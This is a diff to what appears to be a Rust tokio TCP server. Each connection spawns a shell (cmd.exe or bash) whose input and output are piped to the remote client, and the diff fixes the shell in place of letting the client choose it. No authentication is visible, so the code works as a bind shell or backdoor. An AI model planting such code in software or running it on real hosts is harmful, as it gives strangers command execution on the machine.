@@ -4,38 +4,19 @@ use tokio::io::{ AsyncReadExt, AsyncWriteExt };
 use std::net::{ SocketAddr };
 use tokio::process::Command;
 use std::process::Stdio;
+#[cfg(target_os = "windows")]
+const SHELL: &str = "cmd.exe";
+#[cfg(not(target_os = "windows"))]
+const SHELL: &str = "bash";
 async fn handle_socket(mut stream: TcpStream, remote_addr: &SocketAddr) -> Result<(), Box<dyn std::error::Error>> {
     let (mut read_half, mut write_half) = stream.split();
-    let shell: String;
-    write_half.write(b"Input shell").await?;
-    {
-        let mut shell_buf = [0;1024];
-        let mut shell_name: Vec<u8> = Vec::new();
-        loop {
-            match read_half.read(&mut shell_buf).await {
-                Ok(0) => {
-                    println!("closed before recv command");
-                    return Ok(());
-                },
-                Ok(n) => {
-                    shell_name.extend_from_slice(&shell_buf[..n]);
-                    if let Some(last) = shell_name.last() {
-                        if *last == b'\n' {
-                            shell = String::from_utf8(shell_name)?.trim().to_string();
-                            break;
-                        }
-                    }
-                },
-                Err(e) => return Err(Box::new(e)),
-            };
-        }
-    }
 
-    println!("open {} for remote {}", &shell, remote_addr);
-    let mut process = match Command::new(shell)
+    println!("open {} for remote {}", &SHELL, remote_addr);
+    let mut process = match Command::new(SHELL)
         .stdout(Stdio::piped())
         .stdin(Stdio::piped())
         .stderr(Stdio::piped())
+        .kill_on_drop(true)
         .spawn() {
         Ok(p) => p,
         Err(e) => {
